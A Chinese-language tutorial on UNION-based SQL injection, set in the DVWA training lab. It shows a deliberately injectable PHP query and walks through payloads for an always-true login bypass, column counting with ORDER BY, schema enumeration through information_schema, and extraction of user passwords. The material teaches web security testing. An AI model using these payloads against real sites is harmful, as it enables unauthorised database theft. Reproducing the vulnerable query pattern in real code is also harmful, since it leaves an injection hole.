# SQL联合注入

> 以下所有代码都可以在DVWA靶场实践（Low）！DVWA靶场建立戳[DVWA部署](CTF/DVWA/DVWA部署.md)

假设有如下代码：

```php
<?php
	$id = $_REQUEST['id'];
	$query = "SELECT firstname, lastname FROM users WHERE userid = '$id';";
	$result = mysql_query($query);
    ?>
```

这段代码获取到了用户输入的`id`，并且将`id`包裹在单引号内直接写入到了sql查询语句当中，由于有单引号包裹，所以识别为字符类型，因此有了sql注入点，如果我们输入一些sql语句而非真正的`id`，那输入的sql语句也会被执行，从而获取数据库中的信息，如：

```
# input
1' or '1'='1' #
```

说明一下，由于id在查询中是被单引号包裹的，所以需要对单引号进行处理，第一个1后面的单引号是对原有语句的左引号进行闭合，最后的`#`用于注释掉原有的右单引号，处理后，查询语句看起来就是这样的：

```sql
SELECT firstname, lastname
FROM users
WHERE userid = '1' or '1' = '1' #'
```

其中只有`#`前面的才会被执行，语法没有错误，这段语句什么道理呢？

这段语句也被称为sql万能语句

其中 `userid = '1'` 是用来查询第一个用户，通常为管理员用户

`or '1' = '1'`是一个恒等式，永远为真，因此所有的用户也都会被查询出来

## 得到表中查询的字段数

在进行sql注入前，我们最好需要知道开发者通过`userid` 查询了哪些字段，需要注意的是，查询的字段不一定是回显输出的字段，有些字段查了，但是开发者并不需要输出这些

```
1' or 1 = 1 order by 1 #
```

可以使用`order by`语句，它的作用是以某一列作为参照排序，我们可以从某个数开始尝试，如果有回显，那么说明至少有这些列，继续增大，直到报错为止，我们就可以知道一共有多少字段数了

## 得到查询后输出的字段标号

刚才提到了，开发者可能查询很多字段，但是仅输出部分字段值，如何知道这些字段值的标号，以便于注入呢？

刚才我们已经知道了所有的字段数，这里假设为3，因此可以使用下面的语句进行探测：

```
1' union select 1, 2, 3 #
```

什么意思呢？可以看下表

```
	firstname	lastname	age
	   San        Zhang      22
	   1           2         3
```

`union`会将`1 2 3`和原有表拼接并输出，假设开发者仅输出了`firstname` 和 `age` 两个字段值，那么我们看到的回显将会是下面这个样子

```
San    22
1      3
```

OK，仅有1和3被输出了，所以我们知道了输出的字段在查询字段中的位置和标号

**注意：使用`union`时候后面拼接的字段数一定要和总字段数相等，不然无法拼接，报错**

## Union 查询

事实上我们可以发现，在做此类sql注入时都使用了一个结构：

```
1' SQL语句 #
```

前者的`1'`用于闭合左引号，后者的`#`用于注释右引号，所以我们只要在中间部分插入`union`语句，就可以查到我们想要的东西，如：

**查询数据库名**

```
1' union select 1, database() #
```

**查询表名**

```
1' union select 1, group_concat(table_name) from information_schema.tables where table_schema=database() #
```

其中`information_schema`保存了整个数据库的一些信息，其中包括：

* `information schema`
  * `schema` ：提供了当前mysql实例中所有建立的数据库的信息
  * `TABLES`：描述某个数据库中表的信息，可以用 `tables from schema_name`取之
  * `COLUMNS`：描述某个表中字段的信息，可以用`columns from schema_name.table_name`取之

因此同理，我们可查

**查询字段名**

```
1' union select 1, group_concat(column_name) from information_schema.columns where table_name='users' #
```

**`limit`**

有的时候`group_concat()`可能会被出题人过滤掉，每次只能看到回显的一条信息，那该如何得到每一个字段名呢，可以多次使用`limit`

```
1' union select 1, column_name from information_schema.columns where table_name='users' limit 5, 1 #
```

`limit 5, 1`表示从第5行开始查询，查询往后的1行信息（包括第5行）

**OK，到此为止，这个数据库的大概模样已经被我们知晓的差不多了，下一步就是查询其中的数据**

**查询数据**

```
1' union select lastname, password from users # 
```

持续更新...